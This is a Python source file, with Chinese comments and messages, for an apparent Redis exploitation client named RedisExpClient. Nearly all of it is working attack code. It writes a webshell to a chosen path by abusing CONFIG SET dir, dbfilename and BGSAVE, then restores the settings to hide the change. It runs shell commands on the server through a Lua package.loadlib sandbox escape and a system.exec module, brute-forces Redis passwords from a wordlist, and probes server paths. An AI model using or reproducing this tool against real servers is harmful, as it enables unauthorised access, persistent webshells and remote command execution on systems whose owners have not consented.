import shlex
from pathlib import Path
from typing import Callable, Iterable, List, Optional, Sequence, Union

import redis
from redis.exceptions import RedisError

Logger = Callable[[str], None]


def utf8_to_gbk(value: str) -> str:
    try:
        return value.encode("gbk", errors="ignore").decode("gbk", errors="ignore")
    except Exception:
        return value


def gbk_to_utf8(value: str) -> str:
    try:
        return value.encode("gbk", errors="ignore").decode("utf-8", errors="ignore")
    except Exception:
        return value


def format_result(value) -> str:
    if value is None:
        return "Nil"
    if isinstance(value, bytes):
        try:
            return value.decode("utf-8")
        except UnicodeDecodeError:
            return value.hex()
    if isinstance(value, (list, tuple)):
        return "\n".join(f"[{idx}] {format_result(item)}" for idx, item in enumerate(value))
    if isinstance(value, dict):
        return "\n".join(f"{format_result(k)}: {format_result(v)}" for k, v in value.items())
    return str(value)


class RedisExpClient:
    def __init__(self, logger: Optional[Logger] = None):
        self.client: Optional[redis.Redis] = None
        self.host = ""
        self.port = 6379
        self.password = ""
        self.redis_dir = ""
        self.redis_dbfilename = ""
        self.exec_template = "system.exec"
        self.exec_name = "system"
        self.logger = logger or (lambda msg: None)

    # 基础工具
    def log(self, message: str):
        if self.logger:
            self.logger(message)

    def connect(self, host: str, port: Union[int, str], password: str = ""):
        port = int(port)
        self.host = host
        self.port = port
        self.password = password or ""
        self.client = redis.Redis(
            host=host,
            port=port,
            password=password or None,
            socket_timeout=8,
            decode_responses=False,
        )
        self.client.ping()
        self.redis_dir = self.config_get("dir")
        self.redis_dbfilename = self.config_get("dbfilename")
        self.log(f"[+] 连接成功: {host}:{port}")

    def set_exec_options(self, template: str, name: str):
        if template:
            self.exec_template = template
        if name:
            self.exec_name = name

    def ensure_client(self):
        if not self.client:
            raise RuntimeError("请先连接 Redis")

    def config_get(self, key: str) -> str:
        self.ensure_client()
        result = self.client.config_get(key)
        if isinstance(result, dict):
            return result.get(key, "")
        if isinstance(result, list) and result:
            return str(result[-1])
        return ""

    def config_set(self, key: str, value: str) -> str:
        self.ensure_client()
        response = self.client.config_set(key, value)
        return str(response)

    def cli(self, command_line: str) -> str:
        self.ensure_client()
        args = self._parse_args(command_line)
        result = self.client.execute_command(*args)
        formatted = format_result(result)
        self.log(formatted)
        return formatted

    @staticmethod
    def _parse_args(command_line: str) -> Sequence[str]:
        if not command_line:
            return []
        return shlex.split(command_line)

    # 具体模块
    def redis_version(self):
        info = self.cli("INFO")
        self.log(f"dir: {self.redis_dir}")
        self.log(f"dbfilename: {self.redis_dbfilename}")
        return info

    def echo_shell(
        self,
        directory: str,
        filename: str,
        content: str,
        *,
        gbk_mode: bool = False,
    ):
        if gbk_mode:
            directory = utf8_to_gbk(directory)
            filename = utf8_to_gbk(filename)

        original = {
            "dir": self.redis_dir,
            "dbfilename": self.redis_dbfilename,
            "rdbcompression": self.config_get("rdbcompression"),
            "slave-read-only": self.config_get("slave-read-only"),
            "stop-writes-on-bgsave-error": self.config_get("stop-writes-on-bgsave-error"),
        }

        if original["stop-writes-on-bgsave-error"] != "no":
            self.cli("CONFIG SET stop-writes-on-bgsave-error no")

        self.cli(f'CONFIG SET dir "{directory}"')
        self.cli(f'CONFIG SET dbfilename "{filename}"')

        payload = "\n\n\n\n\n" + content + "\n\n\n\n"

        try:
            self.client.set("webshell", payload, ex=120)
        except RedisError as exc:
            if "READONLY" in str(exc).upper() and original["slave-read-only"].lower() == "yes":
                self.cli("CONFIG SET slave-read-only no")
                self.client.set("webshell", payload, ex=120)
            else:
                raise

        self.log(">>> set webshell")

        if original["rdbcompression"] == "yes":
            self.cli("CONFIG SET rdbcompression no")

        self.cli("BGSAVE")
        self.cli("DEL webshell")
        self._restore_config(original)

    def _restore_config(self, configs: dict):
        self.cli(f'CONFIG SET dir "{configs["dir"]}"')
        self.cli(f'CONFIG SET dbfilename "{configs["dbfilename"]}"')
        self.cli(f'CONFIG SET rdbcompression {configs["rdbcompression"]}')
        self.cli(f'CONFIG SET slave-read-only {configs["slave-read-only"]}')
        self.cli(
            "CONFIG SET stop-writes-on-bgsave-error "
            + configs["stop-writes-on-bgsave-error"]
        )

    def run_cmd(self, command: str):
        if not command:
            return
        self.log(f">>> {self.exec_template} \"{command}\"")
        result = self.cli(f'{self.exec_template} "{command}"')
        return result

    def redis_lua(self, command: str):
        lua = (
            'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); '
            "local io = io_l(); "
            f'local f = io.popen("{command}", "r"); '
            'local res = f:read("*a"); f:close(); return res'
        )
        result = self.client.eval(lua, 0)

        # Redis 返回可能是任意二进制数据（例如 cat 二进制文件），直接用 UTF-8 解码会抛出
        # 'utf-8' codec can't decode ... 之类异常，这里采用忽略非法字节的方式保证不报错。
        if isinstance(result, bytes):
            try:
                text = result.decode("utf-8")
            except UnicodeDecodeError:
                text = result.decode("utf-8", errors="ignore")
        else:
            text = str(result)

        self.log(gbk_to_utf8(text))
        return result

    def brute_pwd(self, wordlist: Union[str, Path], target_host: str, target_port: Union[int, str]) -> Optional[str]:
        wordlist = Path(wordlist)
        if not wordlist.exists():
            raise FileNotFoundError(wordlist)

        # 预先统计有效密码总数，用于展示爆破进度
        passwords: List[str] = []
        with wordlist.open("r", encoding="utf-8", errors="ignore") as handler:
            for line in handler:
                pwd = line.strip()
                if pwd:
                    passwords.append(pwd)

        total = len(passwords)
        if total == 0:
            self.log("[-] 字典中未找到有效密码条目")
            return None

        self.log(f"[+] 开始密码爆破，共 {total} 条候选密码")

        for idx, pwd in enumerate(passwords, start=1):
            self.log(f"[爆破进度] {idx}/{total} - 尝试密码: {pwd}")
            try:
                client = redis.Redis(host=target_host, port=int(target_port), password=pwd, socket_timeout=3)
                client.ping()
                self.log(f"[+] 成功爆破: {pwd}")
                return pwd
            except RedisError as exc:
                err = str(exc)
                if "NO PASSWORD" in err.upper():
                    self.log("[+] 存在未授权访问")
                    return ""
                elif "TIMEOUT" in err.upper():
                    raise

        self.log("[-] 未爆破到可用密码")
        return None

    def check_dir(self, path: str, *, gbk_mode: bool = False) -> str:
        if gbk_mode:
            path = utf8_to_gbk(path)
        response = self.config_set("dir", path)
        self.log(f">>> CONFIG SET dir {path}")
        if "Not a directory" in response:
            return "文件存在"
        if "No such file or directory" in response:
            return "文件不存在"
        return response


__all__ = ["RedisExpClient"]

